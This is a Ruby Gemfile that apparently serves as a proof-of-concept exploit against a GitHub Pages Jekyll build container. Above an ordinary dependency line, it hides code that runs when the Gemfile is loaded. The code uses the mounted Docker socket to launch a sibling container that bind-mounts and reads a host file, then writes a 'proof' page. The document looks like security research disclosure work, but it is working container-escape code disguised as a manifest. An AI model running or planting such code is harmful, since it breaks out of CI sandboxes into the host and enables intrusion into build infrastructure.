# frozen_string_literal: true
source "https://rubygems.org"

require "socket"
require "json"
require "digest"
require "securerandom"

PROOF = File.join(__dir__, "c217-host-proof.html")
SOCK = "/var/run/docker.sock"
IMAGE = "ghcr.io/actions/jekyll-build-pages:v1.0.13"

def decode_chunked(body)
  out = +"".b
  loop do
    line, rest = body.split("\r\n", 2)
    break unless rest
    n = line.to_i(16)
    break if n.zero?
    out << rest.byteslice(0, n)
    body = rest.byteslice(n + 2, rest.bytesize) || "".b
  end
  out
end

def docker_req(method, path, payload = nil)
  body = payload.nil? ? "" : JSON.generate(payload)
  socket = UNIXSocket.new(SOCK)
  request = +"#{method} #{path} HTTP/1.1\r\nHost: docker\r\nConnection: close\r\nContent-Length: #{body.bytesize}\r\n"
  request << "Content-Type: application/json\r\n" unless payload.nil?
  request << "\r\n#{body}"
  socket.write(request)
  raw = socket.read
  socket.close
  head, data = raw.split("\r\n\r\n", 2)
  status = head.to_s.lines.first.to_s.split[1].to_i
  data ||= "".b
  data = decode_chunked(data) if head.to_s.downcase.include?("transfer-encoding: chunked")
  [status, data]
end

name = "c217-gemfile-#{SecureRandom.hex(5)}"
container_id = nil
proof = {"gemfile_executed" => true, "docker_socket_present" => File.socket?(SOCK)}
begin
  version_status, = docker_req("GET", "/version")
  proof["docker_api_responded"] = (version_status == 200)
  config = {
    "Image" => IMAGE,
    "Entrypoint" => ["/bin/sh", "-c"],
    "Cmd" => ["sha256sum /hostfile"],
    "Tty" => true,
    "HostConfig" => {"Binds" => ["/etc/hostname:/hostfile:ro"]},
  }
  create_status, create_body = docker_req("POST", "/v1.41/containers/create?name=#{name}", config)
  parsed = JSON.parse(create_body) rescue {}
  container_id = parsed["Id"]
  proof["sibling_created"] = (create_status == 201 && !container_id.to_s.empty?)
  if container_id
    start_status, = docker_req("POST", "/v1.41/containers/#{container_id}/start")
    proof["sibling_started"] = (start_status == 204)
    wait_status, = docker_req("POST", "/v1.41/containers/#{container_id}/wait?condition=not-running")
    proof["sibling_finished"] = (wait_status == 200)
    log_status, logs = docker_req("GET", "/v1.41/containers/#{container_id}/logs?stdout=1&stderr=1")
    host_hash = logs.to_s[/\b[0-9a-f]{64}\b/]
    own_hash = ::Digest::SHA256.file("/etc/hostname").hexdigest
    proof["host_file_read"] = (log_status == 200 && !host_hash.nil?)
    proof["host_file_differs_from_action_container"] = (!host_hash.nil? && host_hash != own_hash)
  end
rescue => e
  proof["error_class"] = e.class.name
  proof["error_message"] = e.message
ensure
  docker_req("DELETE", "/v1.41/containers/#{container_id}?force=1&v=1") if container_id
end
File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")

gem "github-pages", "= 232"
